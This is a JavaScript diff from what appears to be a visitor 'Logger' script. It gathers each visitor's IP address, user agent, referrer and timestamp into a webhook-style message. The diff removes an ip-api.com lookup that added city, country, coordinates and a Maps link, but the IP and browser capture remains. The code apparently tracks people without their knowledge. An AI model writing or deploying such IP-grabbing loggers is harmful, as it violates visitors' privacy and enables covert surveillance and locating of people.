@@ -15,14 +15,6 @@
             const ipData = await ipResponse.json();
             const ipAddress = ipData.ip;
 
-            const locationResponse = await fetch(`http://ip-api.com/json/${ipAddress}`);
-            const locationData = await locationResponse.json();
-            const city = locationData.city;
-            const country = locationData.country;
-            const latitude = locationData.lat;
-            const longitude = locationData.lon;
-            const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
             const logMessage = {
                 username: "Logger",
                 embeds: [{
@@ -32,10 +24,7 @@
                         { name: "User Agent", value: userAgent, inline: false },
                         { name: "IP Address", value: ipAddress, inline: false },
                         { name: "Referrer", value: referrer, inline: false },
-                        { name: "Timestamp", value: timestamp, inline: false },
-                        { name: "City", value: city, inline: false },
-                        { name: "Country", value: country, inline: false },
-                        { name: "Location Link", value: locationLink, inline: false }
+                        { name: "Timestamp", value: timestamp, inline: false }
                     ]
                 }]
             };
